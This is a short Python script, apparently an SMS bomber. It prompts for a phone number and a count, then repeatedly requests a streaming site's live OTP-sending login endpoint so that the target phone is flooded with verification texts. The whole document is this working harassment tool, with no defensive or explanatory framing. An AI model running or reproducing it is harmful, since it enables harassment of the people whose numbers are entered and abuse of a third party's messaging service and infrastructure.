import requests




num=str(input("Enter the number: "))
amount=int(input("Enter the amount: "))
refapi="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+num+"&operator=bd-otp"

for i in range(amount):
  requests.get(refapi)
  print(str(i+1)+" Sent")

